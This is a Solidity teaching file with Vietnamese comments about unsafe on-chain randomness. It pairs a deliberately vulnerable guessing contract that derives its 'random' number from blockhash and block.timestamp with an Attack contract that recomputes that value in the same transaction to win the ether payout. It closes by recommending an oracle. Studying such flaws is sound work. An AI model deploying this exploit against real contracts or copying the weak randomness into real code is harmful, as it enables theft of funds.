// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

// # Bảo mật Sol / Unsafe randomness

contract GuessTheRandomNumber {
    constructor() payable {}
    function guess(uint _guess) public {
        uint answer = uint(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );
        // blockhash k hoạt động trong remix nên k test được trên remix. blockhash trả về hash, ở đây ta lấy hash của block trước đó mà hash k đoán trước đc nên kèm vào timestamp làm random cho chắc r convert sang uint
        // block.timestamp là dấu thời gian của block mà sẽ include cái transaction này.
        // Vì trans này chưa đc mine nên sẽ kb giá trị blocknumber và blocktimestamp là bnh và ng ta dùng làm số random

        if (_guess == answer) {
            (bool sent, ) = msg.sender.call{value: 1 ether}("");
            require(sent, "Failed to send Ether");
        }
    }
}
// Nếu đoán block.timestamp thì rất khó nhưng nếu viết 1 smart contract khác để lấy thì rất dễ
contract Attack {
    receive() external payable {}

    function attack(GuessTheRandomNumber guessTheRandomNumber) public {
        uint answer = uint(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );
        //khi gọi hàm này thì execute luôn hàm contract trên dẫn đến chung 1 trans cùng 1 block thì lấy đc chứ khác block sẽ k lấy được.

        guessTheRandomNumber.guess(answer);
    }

    // Helper function to check balance
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
// Nếu cần randomness, có thể dùng Oracle. Tính randomness mà tự lấy thuần trong blockchain thì kbh là thực sự random